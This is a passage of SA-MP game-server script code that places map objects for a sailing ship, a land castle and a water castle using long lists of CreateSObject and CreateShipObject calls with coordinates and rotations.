	CreateSObject(9831,1620.70,-1372.21,831.84,6.00,0.00,258.10);
	CreateSObject(9831,1630.14,-1371.38,832.03,6.00,0.00,255.25);
	CreateSObject(9831,1623.50,-1368.46,832.03,6.00,0.00,255.25);
	CreateSObject(9831,1628.57,-1377.87,832.03,6.00,0.00,255.25);
	CreateSObject(9831,1635.99,-1378.73,832.03,6.00,0.00,255.25);
	CreateSObject(9831,1637.14,-1374.65,832.03,6.00,0.00,255.25);
	CreateSObject(9831,1645.55,-1381.07,832.03,6.00,0.00,255.25);
	CreateSObject(9831,1641.57,-1380.35,832.03,6.00,0.00,255.25);
	CreateSObject(9831,1646.99,-1374.56,832.03,6.00,0.00,255.25);
	CreateSObject(9831,1656.95,-1379.64,832.03,6.00,0.00,255.25);
	CreateSObject(9831,1655.70,-1386.92,832.03,6.00,0.00,255.25);
	CreateSObject(3280,1591.90,-1353.47,837.35,91.00,0.00,345.42);
	CreateSObject(3280,1590.36,-1353.06,837.36,91.00,0.00,345.42);
	CreateSObject(3280,1590.37,-1353.06,835.76,91.00,0.00,345.42);
	CreateSObject(3280,1591.87,-1353.47,835.76,91.00,0.00,345.42);
	CreateSObject(4030,1376.61,-1313.43,842.01,0.00,0.00,0.00);
	CreateSObject(3865,1419.55,-1318.81,844.80,0.00,0.00,345.41);
	CreateSObject(3865,1417.26,-1326.67,844.80,0.00,0.00,345.41);
	CreateSObject(9831,1427.83,-1328.29,836.93,6.00,0.00,258.10);
	CreateSObject(9831,1429.34,-1321.40,836.93,6.00,0.00,258.10);
	CreateSObject(9831,1429.34,-1321.40,836.93,6.00,0.00,258.10);
	CreateSObject(9831,1427.83,-1328.29,836.93,6.00,0.00,258.10);
	CreateSObject(9831,1408.24,-1315.85,837.33,6.00,0.00,258.10);
	CreateSObject(9831,1406.62,-1323.10,837.33,6.00,0.00,258.10);
	CreateSObject(9831,1406.62,-1323.10,837.33,6.00,0.00,258.10);
	CreateSObject(9831,1408.24,-1315.85,837.33,6.00,0.00,258.10);
	CreateSObject(9831,1385.36,-1317.93,838.02,6.00,0.00,258.10);
	CreateSObject(9831,1387.05,-1310.69,838.02,6.00,0.00,258.10);
	CreateSObject(9831,1387.05,-1310.69,838.02,6.00,0.00,258.10);
	CreateSObject(9831,1385.36,-1317.93,838.02,6.00,0.00,258.10);
	CreateSObject(9831,1365.56,-1305.38,838.51,6.00,0.00,258.10);
	CreateSObject(9831,1364.00,-1312.67,838.51,6.00,0.00,258.10);
	CreateSObject(9831,1337.79,-1301.79,842.17,6.00,0.00,258.10);
	CreateSObject(9831,1365.56,-1305.38,838.51,6.00,0.00,258.10);
	CreateSObject(17025,1340.80,-1292.50,835.42,0.00,0.00,8.17);
	CreateSObject(17025,1334.19,-1290.77,834.41,0.00,0.00,75.35);
	CreateSObject(17025,1329.43,-1306.36,835.42,0.00,0.00,8.17);
	CreateSObject(17025,1332.72,-1295.83,834.41,0.00,0.00,75.35);
	CreateSObject(17025,1330.42,-1292.45,837.87,0.00,0.00,80.54);
	CreateSObject(17025,1333.73,-1293.29,834.41,0.00,0.00,80.54);
	CreateSObject(17025,1328.49,-1298.05,837.87,0.00,0.00,80.54);
	CreateSObject(9831,1364.00,-1312.67,838.51,6.00,0.00,258.10);
	CreateSObject(9831,1338.12,-1298.08,842.86,6.00,0.00,258.10);
	CreateSObject(9831,1335.16,-1305.57,842.70,6.00,0.00,277.68);
	CreateSObject(9831,1333.67,-1308.48,843.00,6.00,0.00,277.68);
	CreateSObject(3865,1593.54,-1362.40,839.71,0.00,0.00,345.41);
	CreateSObject(3865,1582.67,-1358.08,832.79,0.00,0.00,351.06);
	CreateSObject(3865,1598.25,-1327.92,835.97,0.00,0.00,345.31);
	CreateSObject(9831,1593.60,-1336.86,833.97,9.00,0.00,163.70);
	CreateSObject(11342,1734.20,-1339.40,837.36,0.00,0.00,74.70);
	CreateSObject(3865,1600.65,-1319.15,835.97,0.00,0.00,345.31);
	CreateSObject(3865,1603.03,-1310.46,835.97,0.00,0.00,345.31);
	CreateSObject(3865,1598.65,-1302.97,835.97,0.00,0.00,255.49);
	CreateSObject(3865,1610.50,-1306.29,835.97,0.00,0.00,255.49);
	CreateSObject(3865,1606.35,-1298.62,835.97,0.00,0.00,345.31);
	CreateSObject(3280,1607.02,-1312.15,834.53,0.00,0.00,345.16);
	CreateSObject(3280,1604.06,-1303.55,834.53,0.00,0.00,345.16);
	CreateSObject(3280,1605.55,-1303.96,834.53,0.00,0.00,345.16);
	CreateSObject(3865,1619.25,-1308.63,835.97,0.00,0.00,255.49);
	CreateSObject(17026,1607.12,-1306.69,798.67,0.00,0.00,-141.45);
	CreateSObject(17026,1591.13,-1312.69,816.53,0.00,0.00,128.13);
	CreateSObject(17026,1596.94,-1291.20,816.53,0.00,0.00,46.29);
	CreateSObject(17026,1622.81,-1298.14,816.53,0.00,0.00,-41.85);
	CreateSObject(3280,1605.16,-1305.47,834.53,0.00,0.00,345.16);
	CreateSObject(3280,1603.66,-1305.07,834.53,0.00,0.00,345.16);
	CreateSObject(17026,1612.35,-1318.62,816.53,0.00,0.00,-140.97);
	CreateSObject(17026,1612.86,-1308.73,798.67,0.00,0.00,-141.45);
	CreateSObject(17026,1571.64,-1315.72,816.53,0.00,0.00,128.13);
	CreateSObject(3865,1590.37,-1300.72,835.97,0.00,0.00,255.49);
	CreateSObject(3865,1582.16,-1298.64,835.97,0.00,0.00,255.49);
	CreateSObject(9831,1579.19,-1297.43,836.90,6.00,0.00,267.48);
	CreateSObject(9831,1604.63,-1305.40,833.32,6.00,0.00,254.36);
	CreateSObject(9831,1603.94,-1306.16,833.31,6.00,0.00,165.34);
	CreateSObject(3865,1608.73,-1289.88,835.97,0.00,0.00,345.31);
	CreateSObject(3865,1610.77,-1282.41,835.97,0.00,0.00,345.31);
	CreateSObject(17026,1592.64,-1274.52,816.53,0.00,0.00,46.29);
	CreateSObject(9831,1611.39,-1278.71,836.90,6.00,0.00,183.90);
	CreateSObject(3865,1628.10,-1311.00,835.97,0.00,0.00,255.49);
	CreateSObject(3865,1636.91,-1313.37,835.97,0.00,0.00,255.49);
	CreateSObject(3865,1645.87,-1315.68,835.97,0.00,0.00,255.49);
	CreateSObject(17026,1649.02,-1288.92,816.08,0.00,0.00,-41.85);
	CreateSObject(17026,1649.46,-1287.56,820.80,0.00,0.00,-41.85);
	CreateSObject(17026,1625.34,-1321.92,837.66,0.00,0.00,-41.85);
	CreateSObject(17026,1647.45,-1303.75,816.08,0.00,0.00,-41.85);
	CreateSObject(17026,1643.17,-1338.68,829.05,0.00,0.00,-41.85);
	CreateSObject(17026,1634.02,-1336.06,829.05,0.00,0.00,-41.85);
	CreateSObject(11337,1902.55,-1369.85,832.21,0.00,0.00,72.55);
	CreateSObject(4518,1820.66,-1353.05,836.13,0.00,0.00,-196.02);
	CreateSObject(4518,1824.51,-1372.49,836.13,0.00,0.00,-196.02);
	CreateSObject(3585,1666.24,-1322.97,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1674.29,-1325.10,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1682.40,-1327.19,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1690.51,-1329.33,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1698.70,-1331.45,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1706.88,-1333.60,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1714.99,-1335.72,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1737.43,-1341.64,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1745.63,-1343.86,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1754.09,-1346.08,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1762.29,-1348.21,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1770.45,-1350.36,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1778.63,-1352.53,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1672.66,-1320.45,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1680.80,-1322.67,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1688.92,-1324.79,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1697.01,-1326.91,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1705.89,-1329.23,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1714.23,-1331.38,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1727.33,-1334.84,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1735.55,-1336.97,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1743.65,-1339.08,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1751.79,-1341.20,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1775.52,-1347.59,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1783.60,-1349.73,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1791.88,-1351.90,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1795.13,-1357.04,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1803.14,-1359.12,835.89,0.00,0.00,345.41);
	CreateSObject(3585,1801.69,-1354.46,835.89,0.00,0.00,345.41);
	CreateSObject(3865,1604.58,-1304.41,842.21,271.00,0.00,345.00);
	CreateSObject(17026,1609.48,-1282.49,865.55,0.00,-171.00,30.47);
	// Sailing Ship
	CreateShipObject(9585, -2157.882324, -3104.491943, 4.294658, 0.0000, 0.0000, 0.0000);
	CreateShipObject(9586, -2160.159424, -3104.503418, 14.372366, 0.0000, 0.0000, 0.0000);
	CreateShipObject(19123, -2130.8479,-3114.2451,13.7942,0.00, 0.00, 0.00);
	CreateShipObject(19123, -2130.7898,-3094.5627,13.7942,0.00, 0.00, 0.00);
	CreateShipObject(19123, -2150.4104,-3094.6675,13.7942,0.00, 0.00, 0.00);
	CreateShipObject(19123, -2150.2920,-3114.2759,13.7942,0.00, 0.00, 0.00);
	CreateShipObject(19129, -2140.5920,-3104.3965,13.7239,   0.00, 0.00, 0.00);
	CreateShipObject(19129, -2140.5920, -3104.3965, 23.3000, 180.00, 0.00, 0.00);
	CreateShipObject(18102, -2132.8005,-3113.3000,24.0000,   0.00, 0.00, 0.00);
	CreateShipObject(18102, -2139.5171,-3106.3816,24.0000,   0.00, 0.00, 4.62);
	CreateShipObject(18102, -2132.8005,-3099.3000,24.0000,   0.00, 0.00, 4.14);
	CreateShipObject(10793, -2233.062012, -3104.470215, 33.719322, 0.0000, 0.0000, 0.0000);
	CreateShipObject(13749, -2190.369629, -3102.543701, 6.942337, 0.0000, 0.0000, 233.0537);
	CreateShipObject(974, -2197.008057, -3094.481201, -0.153949, 89.3814, 0.0000, 305.4689);
	CreateShipObject(995, -2200.326904, -3093.005615, 0.833968, 91.1002, 0.0000, 35.4688);
	CreateShipObject(974, -2193.611572, -3099.242676, -0.156063, 89.3814, 0.0000, 305.4689);
	CreateShipObject(974, -2201.451660, -3097.683105, -0.103217, 89.3814, 0.0000, 305.4689);
	CreateShipObject(974, -2198.119141, -3102.427002, -0.088869, 89.3814, 0.0000, 305.4689);
	CreateShipObject(995, -2204.843750, -3096.191895, 0.835255, 91.1002, 0.0000, 35.4688);
	CreateShipObject(995, -2202.630615, -3100.581055, 0.775042, 91.1002, 0.0000, 125.4688);
	CreateShipObject(995, -2199.291992, -3105.276611, 0.786779, 91.1002, 0.0000, 125.4688);
	CreateShipObject(995, -2194.924072, -3103.850098, 0.759851, 91.1002, 0.0000, 215.4689);
	CreateShipObject(995, -2190.476563, -3100.696289, 0.728639, 91.1002, 0.0000, 215.4689);
	CreateShipObject(996, -2190.421631, -3099.644287, 0.948313, 0.0000, 0.0000, 125.4689);
	CreateShipObject(14582, -2059.895996, -3103.853271, 18.583061, 0.0000, 0.0000, 11.2500);
	CreateShipObject(1515, -2077.232666, -3089.748535, 13.650811, 0.0000, 0.0000, 347.8905);
	CreateShipObject(2872, -2078.044678, -3089.519531, 13.646507, 0.0000, 0.0000, 347.9679);
	CreateShipObject(2785, -2064.882813, -3115.334961, 15.943402, 0.0000, 0.0000, 202.5000);
	CreateShipObject(2779, -2076.468018, -3089.902832, 13.660801, 0.0000, 0.0000, 347.0311);
	CreateShipObject(2778, -2074.524902, -3118.607910, 13.654146, 0.0000, 0.0000, 191.2500);
	CreateShipObject(2618, -2075.350098, -3118.789063, 13.654146, 0.0000, 0.0000, 192.9689);
	CreateShipObject(2754, -2076.150879, -3119.058838, 14.598872, 0.0000, 0.0000, 284.6877);
	CreateShipObject(2188, -2071.781982, -3098.020264, 14.639132, 0.0000, 0.0000, 270.0000);
	CreateShipObject(1978, -2085.850342, -3101.217285, 14.704240, 0.0000, 0.0000, 270.0000);
	CreateShipObject(1897, -2070.512939, -3104.423340, 14.771361, 0.0000, 0.0000, 270.0000);
	CreateShipObject(1895, -2070.685303, -3104.431885, 15.877012, 0.0000, 0.0000, 270.0000);
	CreateShipObject(1978, -2085.955811, -3107.053467, 14.704240, 0.0000, 0.0000, 90.0000);
	CreateShipObject(2188, -2071.721191, -3111.333252, 14.639132, 0.0000, 0.0000, 270.0000);
	CreateShipObject(2785, -2064.629150, -3093.764404, 15.935765, 0.0000, 0.0000, 337.5000);
	CreateShipObject(2762, -2071.647217, -3104.551025, 14.058804, 0.0000, 0.0000, 90.0000);
	CreateShipObject(2723, -2065.701416, -3103.575195, 15.467032, 0.0000, 0.0000, 0.0000);
	CreateShipObject(2723, -2064.544922, -3107.523682, 15.467032, 0.0000, 0.0000, 0.0000);
	CreateShipObject(2723, -2064.287354, -3100.106201, 15.467032, 0.0000, 0.0000, 0.0000);
	CreateShipObject(2723, -2055.370361, -3099.791016, 15.467032, 0.0000, 0.0000, 0.0000);
	CreateShipObject(2723, -2053.830566, -3103.792236, 15.467032, 0.0000, 0.0000, 0.0000);
	CreateShipObject(2723, -2055.576416, -3107.495850, 15.467032, 0.0000, 0.0000, 0.0000);
	CreateShipObject(1432, -2088.407471, -3114.988037, 13.785418, 0.0000, 0.0000, 0.0000);
	CreateShipObject(1432, -2092.433105, -3112.103516, 13.785418, 0.0000, 0.0000, 0.0000);
	CreateShipObject(1432, -2092.936768, -3117.935791, 13.785416, 0.0000, 0.0000, 0.0000);
	CreateShipObject(1432, -2087.828369, -3093.458496, 13.785418, 0.0000, 0.0000, 0.0000);
	CreateShipObject(1432, -2092.120361, -3090.224365, 13.785418, 0.0000, 0.0000, 0.0000);
	CreateShipObject(1432, -2092.081299, -3095.931152, 13.785418, 0.0000, 0.0000, 0.0000);
	CreateShipObject(1979, -2084.495117, -3101.034912, 14.636818, 0.0000, 0.0000, 0.0000);
	CreateShipObject(1979, -2087.261230, -3107.257324, 14.674006, 0.0000, 0.0000, 0.0000);
	CreateShipObject(990, -2102.989746, -3095.483154, 15.196386, 0.0000, 0.0000, 90.0000);
	CreateShipObject(990, -2102.937256, -3113.443115, 15.196386, 0.0000, 0.0000, 90.0000);
	CreateShipObject(992, -2102.909180, -3120.190918, 15.216834, 0.0000, 0.0000, 90.0000);
	CreateShipObject(992, -2102.985352, -3088.885986, 15.216834, 0.0000, 0.0000, 90.0000);
	CreateShipObject(3441, -2102.857178, -3100.969727, 15.636929, 0.0000, 0.0000, 0.0000);
	CreateShipObject(3441, -2102.991455, -3108.010742, 15.629290, 0.0000, 0.0000, 0.0000);
	CreateShipObject(991, -2099.960449, -3087.214600, 14.966158, 0.0000, 0.0000, 0.0000);
	CreateShipObject(991, -2099.890625, -3121.886230, 14.916151, 0.0000, 0.0000, 0.0000);
	// Land Castle
	CreateSObject(8391, -32.5, 1818.2998, 37.9, 0, 0, 0);
	CreateSObject(8620, -55.4, 1863.30005, 39.2, 0, 0, 90);
	CreateSObject(8391, -23.2, 1900.19995, 37.9, 0, 0, 270);
	CreateSObject(8391, 40.9, 1892.40002, 36.9, 0, 0, 180);
	CreateSObject(8391, 32.2, 1809.30005, 37.9, 0, 0, 90);
	CreateSObject(8620, 64, 1846.09998, 39.2, 0, 0, 90);
	CreateSObject(3279, -41.7, 1800.80005, 16.6, 0, 0, 0);
	CreateSObject(3279, 49.8, 1800.40002, 16.6, 0, 0, 90);
	CreateSObject(3279, 50, 1910.40002, 16.6, 0, 0, 270);
	CreateSObject(3279, -39.8, 1908.59998, 16.6, 0, 0, 272);
	CreateSObject(974, 17.6, 1875, 19.3, 0, 0, 0);
	CreateSObject(974, 10.9, 1875, 19.3, 0, 0, 0);
	CreateSObject(974, 4.3, 1875, 19.3, 0, 0, 0);
	CreateSObject(974, -2.3, 1875, 19.3, 0, 0, 0);
	CreateSObject(9819, 6.9, 1873.30005, 17.3, 0, 0, 92);
	CreateSObject(974, -5.59961, 1871.7002, 19.3, 0, 0, 90);
	CreateSObject(974, -5.6, 1865, 19.3, 0, 0, 90);
	CreateSObject(1523, -5.6, 1861.69995, 19, 0, 0, 270);
	CreateSObject(1523, -5.6, 1858.66003, 19, 0, 0, 90);
	CreateSObject(1523, -5.6, 1861.69995, 16.6, 0, 0, 270);
	CreateSObject(1523, -5.6, 1858.66003, 16.6, 0, 0, 90);
	CreateSObject(974, -5.5, 1855.40002, 19.3, 0, 0, 90);
	CreateSObject(974, -2.2, 1852.09998, 19.3, 0, 0, 0);
	CreateSObject(974, 20.9, 1871.69995, 19.3, 0, 0, 270);
	CreateSObject(974, 20.88, 1865.09998, 19.3, 0, 0, 269.99);
	CreateSObject(974, 4.2002, 1852.1104, 19.3, 0, 0, 0);
	CreateSObject(974, 10.8, 1852.09998, 19.3, 0, 0, 0);
	CreateSObject(974, 17.5, 1852.09998, 19.3, 0, 0, 0);
	CreateSObject(974, 20.9, 1858.5, 19.3, 0, 0, 269.99);
	CreateSObject(3277, 7.9, 1863.6, 16.6, 0, 0, 359.995);
	CreateSObject(3279, 6, 1879.19995, 16.6, 0, 0, 90);
	CreateSObject(3279, 5.8, 1847.40002, 16.6, 0, 0, 180);
	CreateSObject(11443, 7.28, 1823.53003, 16.6, 0, 358, 140);
	CreateSObject(11445, 27.6, 1831.30005, 16.6, 0, 0, 0);
	CreateSObject(11458, -26.1, 1819.19995, 16.6, 0, 0, 0);
	CreateSObject(11445, 42.65, 1891.03003, 16.6, 0, 0, 0);
	CreateSObject(11443, -27.4, 1877.30005, 16.6, 0, 0, 0);
	CreateSObject(11443, -6777.2998, 1281.29004, 16.6, 0, 0, 52);
	CreateSObject(1231, 20.8, 1874.90002, 19.4, 0, 0, 0);
	CreateSObject(1231, 20.7, 1852.30005, 19.4, 0, 0, 0);
	CreateSObject(1231, -5.4, 1852.09998, 19.4, 0, 0, 0);
	CreateSObject(1231, -5.6, 1874.69995, 19.4, 0, 0, 0);
	CreateSObject(974, 20.9, 1855.30005, 19.3, 0, 0, 269.99);
	CreateSObject(746, 14.96, 1889.98999, 16.5, 0, 0, 90);
	CreateSObject(618, -9.92, 1891.20996, 16.6, 0, 0, 0);
	CreateSObject(618, -3.8, 1833.30005, 16.6, 0, 0, 0);
	CreateSObject(618, 37.4, 1820.19995, 16.6, 0, 0, 0);
	CreateSObject(7916, -26512.59961, -3081.22998, 38.5, 0, 0, 0);
	CreateSObject(7916, 5.05, 1811.13, 20.75, 0, 0, 174.71);
	CreateSObject(7916, -2.32, 1901.05005, 20.51, 0, 0, 353.66);
	CreateSObject(16133, -11.16, 1794.16003, 15.46, 0, 0, 254.09);
	CreateSObject(16133, 2.85, 1794.57996, 15.46, 0, 0, 254.09);
	CreateSObject(16133, 3.78, 1915.13, 15.46, 0, 0, 72.42);
	CreateSObject(16133, 16.8, 1915.65002, 15.46, 0, 0, 72.42);
	CreateSObject(3267, 7.8, 1863.6, 16.7, 0, 0, 87.995);
	// Water Castle
	CreateSObject(12857, -768.32141, 640.77344, -2.33175,   0.00000, 0.00000, 358.08725);
	CreateSObject(12857, -769.40558, 599.56091, -2.33570,   0.00000, 0.00000, 358.08719);
	CreateSObject(12857, -770.55878, 558.24438, -2.33970,   0.00000, 0.00000, 358.08719);
	CreateSObject(12857, -771.77667, 516.83447, -2.34370,   0.00000, 0.00000, 358.08719);
	CreateSObject(8499, -710.33759, 453.30161, 32.43682,   0.00000, 0.00000, 339.85574);
	CreateSObject(14414, -768.95258, 490.30966, 0.94268,   0.00000, 0.00000, 0.00000);
	CreateSObject(14414, -772.94812, 490.31479, 0.94270,   0.00000, 0.00000, 0.00000);
	CreateSObject(14414, -775.34552, 490.31281, 0.94070,   0.00000, 0.00000, 0.00000);
	CreateSObject(8553, -747.32733, 463.23578, 4.05900,   0.00000, 0.00000, 0.00000);
	CreateSObject(8553, -707.55438, 456.92181, 4.05300,   0.00000, 0.00000, 0.00000);
	CreateSObject(8553, -804.28613, 465.43631, 4.05300,   0.00000, 0.00000, 0.00000);
	CreateSObject(8499, -703.01581, 334.56097, 32.43682,   0.00000, 0.00000, 251.01884);
	CreateSObject(8499, -841.72662, 326.89282, 32.43682,   0.00000, 0.00000, 160.88126);
	CreateSObject(8499, -844.93060, 450.57367, 32.43682,   0.00000, 0.00000, 70.28841);
	CreateSObject(4585, -774.61047, 281.13248, -29.00787,   0.00000, 0.00000, 0.24076);
	CreateSObject(8553, -841.47681, 465.55408, 4.04700,   0.00000, 0.00000, 0.00000);
	CreateSObject(8553, -839.01569, 425.94159, 4.08500,   0.00000, 0.00000, 0.00000);
	CreateSObject(8553, -861.79559, 332.97388, 4.04700,   0.00000, 0.00000, 270.55502);
	CreateSObject(8553, -822.00317, 333.31351, 4.04500,   0.00000, 0.00000, 90.42170);
	CreateSObject(8553, -693.00562, 427.99030, 4.04900,   0.00000, 0.00000, 269.40909);
	CreateSObject(8553, -698.53503, 368.31189, 4.04900,   0.00000, 0.00000, 269.40909);
	CreateSObject(8553, -710.56494, 318.82309, 4.04900,   0.00000, 0.00000, 179.19073);
	CreateSObject(8553, -771.90625, 320.50900, 4.04900,   0.00000, 0.00000, 179.19073);
	CreateSObject(8553, -845.89868, 382.99457, 4.04900,   0.00000, 0.00000, 180.12337);
	CreateSObject(8553, -743.13513, 417.18390, 4.04900,   0.00000, 0.00000, 180.12337);
	CreateSObject(8553, -789.65863, 415.90601, 4.04500,   0.00000, 0.00000, 271.02411);
	CreateSObject(8553, -737.69562, 367.48209, 4.04300,   0.00000, 0.00000, 271.02411);
	CreateSObject(8553, -777.54742, 370.02258, 4.04300,   0.00000, 0.00000, 271.02411);
	CreateSObject(8553, -799.45947, 346.10019, 4.03900,   0.00000, 0.00000, 271.02411);
	CreateSObject(8553, -817.03778, 404.40598, 4.03900,   0.00000, 0.00000, 271.02411);
	CreateSObject(8553, -856.16144, 404.56308, 4.03900,   0.00000, 0.00000, 271.02411);
	CreateSObject(8553, -767.76447, 444.83936, 4.03900,   0.00000, 0.00000, 189.04968);
	CreateSObject(8553, -746.45172, 329.09726, 4.03900,   0.00000, 0.00000, 91.20257);
	CreateSObject(8553, -704.69788, 363.79642, 4.03900,   0.00000, 0.00000, 91.20257);
	CreateSObject(8553, -712.10651, 420.08777, 4.03900,   0.00000, 0.00000, 91.20257);
	CreateSObject(18844, -774.39728, 399.76944, -40.17776,   0.00000, 0.00000, 0.00000);
	CreateSObject(3277, -774.61090, 399.66245, 8.90003,   0.00000, 0.00000, 84.76120);
	CreateSObject(19362, -774.13696, 403.16815, 9.19810,   0.00000, 90.00000, 353.09601);
	CreateSObject(19362, -776.41101, 402.63550, 9.18810,   0.00000, 90.00000, 42.13960);
	CreateSObject(19362, -775.15179, 396.17419, 9.14810,   0.00000, 90.00000, 144.90961);
	CreateSObject(19362, -777.84192, 400.30701, 9.18010,   0.00000, 90.00000, 69.14330);
	CreateSObject(19362, -777.23077, 397.78741, 9.17610,   0.00000, 90.00000, 107.12840);
	CreateSObject(19362, -772.83295, 396.49680, 9.14610,   0.00000, 90.00000, 196.17833);
	CreateSObject(19362, -772.07208, 401.97549, 9.19210,   0.00000, 90.00000, 228.38730);
	CreateSObject(19362, -770.66858, 399.96960, 9.13210,   0.00000, 90.00000, 216.65691);
	CreateSObject(19362, -771.54749, 397.85449, 9.12810,   0.00000, 90.00000, 244.21840);
	CreateSObject(3267, -774.62170, 399.65280, 8.91630,   0.00000, 0.00000, 0.00000);
	CreateSObject(6964, -795.28906, 377.95065, 3.33277,   0.00000, 0.00000, 0.00000);
	CreateSObject(6964, -803.16199, 393.35553, 3.33277,   0.00000, 0.00000, 0.00000);
	CreateSObject(6964, -803.66644, 410.53107, 3.33277,   0.00000, 0.00000, 0.00000);
	CreateSObject(6964, -793.56378, 424.52869, 3.33277,   0.00000, 0.00000, 0.00000);
	CreateSObject(6964, -777.33777, 430.75964, 3.33277,   0.00000, 0.00000, 0.00000);
	CreateSObject(6964, -760.40833, 427.57767, 3.33277,   0.00000, 0.00000, 0.00000);
	CreateSObject(6964, -747.78217, 416.00204, 3.33277,   0.00000, 0.00000, 0.00000);
	CreateSObject(6964, -743.03412, 399.15714, 3.33277,   0.00000, 0.00000, 0.00000);
	CreateSObject(6964, -748.25555, 382.54794, 3.33277,   0.00000, 0.00000, 0.00000);
	CreateSObject(6964, -761.56573, 371.49466, 3.33277,   0.00000, 0.00000, 0.00000);
	CreateSObject(6964, -779.21820, 370.10922, 3.33277,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -751.21259, 392.60980, 3.38210,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -750.92212, 406.20715, 3.38210,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -758.02008, 417.74783, 3.38210,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -769.84839, 423.43033, 3.38210,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -783.54016, 422.36508, 3.38210,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -794.26501, 414.34399, 3.38210,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -798.93951, 402.47458, 3.38210,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -795.78925, 387.78494, 3.38210,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -785.52789, 378.32944, 3.38210,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -770.79095, 375.51285, 3.38210,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -758.38330, 381.21625, 3.38210,   0.00000, 0.00000, 0.00000);
	CreateSObject(1607, -764.76599, 498.12274, 2.32599,   20.00000, 0.00000, 25.62388);
	CreateSObject(1607, -778.96930, 498.40988, 2.32599,   20.00000, 0.00000, 327.95203);
	CreateSObject(11441, -758.59863, 301.84781, 70.98204,   0.00000, 0.00000, 0.00000);
	CreateSObject(11441, -791.97485, 300.75671, 70.98204,   0.00000, 0.00000, 89.71954);
	CreateSObject(3279, -755.87238, 309.43088, 4.02180,   0.00000, 0.00000, 180.00000);
	CreateSObject(3279, -787.65942, 311.45190, 4.02180,   0.00000, 0.00000, 0.00000);
	CreateSObject(7588, -851.69159, 334.21259, 8.00174,   0.00000, 0.00000, 33.94096);
	CreateSObject(7916, -838.84540, 322.83786, 7.11771,   0.00000, 0.00000, 138.89574);
	CreateSObject(3509, -844.04956, 352.99307, 6.56552,   0.00000, 0.00000, 0.00000);
	CreateSObject(3509, -863.39447, 371.62860, 6.56552,   0.00000, 0.00000, 0.00000);
	CreateSObject(3509, -861.57062, 363.48883, 6.05126,   0.00000, 0.00000, 0.00000);
	CreateSObject(621, -844.35706, 314.04819, 10.87109,   0.00000, 0.00000, 1.78697);
	CreateSObject(621, -857.35840, 316.93643, 10.87109,   0.00000, 0.00000, 1.78697);
	CreateSObject(621, -866.56128, 331.86636, 10.87109,   0.00000, 0.00000, 1.78697);
	CreateSObject(16110, -834.79071, 298.78879, 0.05609,   0.00000, 0.00000, 34.67748);
	CreateSObject(16110, -853.28247, 316.27106, -2.87978,   0.00000, 0.00000, 34.67748);
	CreateSObject(647, -861.03265, 369.38599, 10.48357,   0.00000, 0.00000, 0.00000);
	CreateSObject(16110, -857.99609, 386.63663, 0.88201,   0.00000, 0.00000, 0.00000);
	CreateSObject(16110, -858.83099, 428.92139, 0.88201,   0.00000, 0.00000, 0.00000);
	CreateSObject(16110, -827.62476, 472.43997, -0.21909,   0.00000, 0.00000, 259.84631);
	CreateSObject(16110, -854.65289, 462.66156, -0.21909,   0.00000, 0.00000, 313.48260);
	CreateSObject(16110, -749.79156, 468.74969, -0.21909,   0.00000, 0.00000, 259.84631);
	CreateSObject(16110, -689.88629, 420.13193, -0.21909,   0.00000, 0.00000, 177.90126);
	CreateSObject(16110, -717.82611, 462.44241, -0.21909,   0.00000, 0.00000, 259.84631);
	CreateSObject(16110, -692.92181, 459.75565, -0.21909,   0.00000, 0.00000, 189.58344);
	CreateSObject(16110, -691.61127, 377.94611, -0.21909,   0.00000, 0.00000, 177.90126);
	CreateSObject(16110, -690.32507, 318.52426, -0.21909,   0.00000, 0.00000, 101.07845);
	CreateSObject(16110, -692.15198, 339.12680, -0.21909,   0.00000, 0.00000, 177.90126);
	CreateSObject(16110, -722.03571, 315.94171, -0.21909,   0.00000, 0.00000, 101.07845);
	CreateSObject(16110, -805.92755, 311.01022, -0.21909,   0.00000, 0.00000, 101.07845);
	CreateSObject(16112, -733.24548, 349.26529, -4.81739,   0.00000, 0.00000, 0.00000);
	CreateSObject(16112, -831.72760, 440.88483, -4.81739,   0.00000, 0.00000, 0.00000);
	CreateSObject(3279, -701.57263, 447.62036, 4.02180,   0.00000, 0.00000, 180.00000);
	CreateSObject(11457, -798.74231, 342.44559, 3.62760,   0.00000, 0.00000, 0.00000);
	CreateSObject(11440, -708.82532, 396.60211, 3.44738,   0.00000, 0.00000, 0.00000);
	CreateSObject(11442, -762.41168, 451.72522, 4.01893,   0.00000, 0.00000, 0.00000);
	CreateSObject(11442, -826.03723, 398.77521, 4.07553,   0.00000, 0.00000, 294.61639);
